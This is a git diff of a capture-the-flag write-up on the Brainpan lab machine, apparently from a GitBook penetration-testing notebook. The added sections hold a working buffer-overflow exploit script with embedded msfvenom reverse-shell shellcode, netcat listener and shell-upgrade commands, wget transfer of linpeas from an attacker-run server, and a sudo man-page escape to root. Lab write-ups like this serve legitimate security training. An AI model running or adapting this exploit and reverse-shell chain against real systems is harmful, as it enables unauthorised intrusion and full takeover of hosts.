@@ -24,7 +24,7 @@ nmap -sV -sT -O -p 1-65535 $VICTIM
 
 Abyss appears to have a program running but we can't interact.&#x20;
 
-![](<../../.gitbook/assets/image (5).png>)
+![](<../../.gitbook/assets/image (5) (5).png>)
 
 ```
 gobuster dir -u http://$VICTIM:9999 -w /usr/share/dirb/wordlists/big.txt -t 50
@@ -45,6 +45,8 @@ gobuster dir -u http://$VICTIM:10000 -w /usr/share/dirb/wordlists/big.txt -t 50
 brainpan.exe file found.
 
 <figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+## Initial Shell
 
 ### Test Machine
 
@@ -164,7 +166,7 @@ python exploit.py $VICTIM 9999
 !mona findmsp -distance 1000
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (7).png" alt=""><figcaption></figcaption></figure>
 
 **exploit.py - Code Changes #2**
 
@@ -272,7 +274,7 @@ except:
 
 
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (4).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
@@ -377,7 +379,7 @@ python exploit.py $TESTMACHINE 9999
 
 <figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-### Exploit - Production
+### Exploit - Production #1
 
 The program worked against our staging environment so it should work against the actual box we're trying to exploit. It ends up working with exploit.py.
 
@@ -393,4 +395,117 @@ rlwrap nc -lvnp 4444
 python exploit.py $VICTIM 9999
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (8).png" alt=""><figcaption></figcaption></figure>
+
+### Exploit - Production #2
+
+Shortly after exploring the Victims OS it had the directory of a Linux server. I realized that it was running.&#x20;
+
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+```
+
+#### **exploit.py - Code Changes #4**
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = ""
+	offset = 524
+	overflow = "A" * offset
+	retn = "\xf3\x12\x17\x31"
+	padding =  "\x90" * 16
+	payload = ("\xd9\xc9\xd9\x74\x24\xf4\x5f\xba\xec\xbf\x44\xe4\x29\xc9\xb1"
+"\x12\x31\x57\x17\x03\x57\x17\x83\x03\x43\xa6\x11\xea\x67\xd0"
+"\x39\x5f\xdb\x4c\xd4\x5d\x52\x93\x98\x07\xa9\xd4\x4a\x9e\x81"
+"\xea\xa1\xa0\xab\x6d\xc3\xc8\x21\x84\xc0\xb7\x5e\x9a\x26\xd6"
+"\xc2\x13\xc7\x68\x9c\x73\x59\xdb\xd2\x77\xd0\x3a\xd9\xf8\xb0"
+"\xd4\x8c\xd7\x47\x4c\x39\x07\x87\xee\xd0\xde\x34\xbc\x71\x68"
+"\x5b\xf0\x7d\xa7\x1c")
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+**Kali #1**
+
+```
+nc -lvnp 4444
+```
+
+**Kali #2**
+
+```
+python exploit.py $VICTIM 9999
+```
+
+**Victim**
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+
+### **Transfer WinPeas**
+
+I tried transfering WinPeas but it couldn't run.
+
+**Kali**
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+wget http://10.10.243.191:81/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+## Privilege Escalation
+
+We discovered we can run the command anansi\_util as sudo without a password. gtfobins showed a way to become root if we can run manual which the program allowed us to do.
+
+**Exploit:** [https://gtfobins.github.io/gtfobins/man/](https://gtfobins.github.io/gtfobins/man/)
+
+```
+sudo -l
+sudo /home/anansi/bin/anansi_util manual
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
+<pre><code>sudo /home/anansi/bin/anansi_util manual man
+<strong>!/bin/sh
+</strong>whoami
+</code></pre>
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
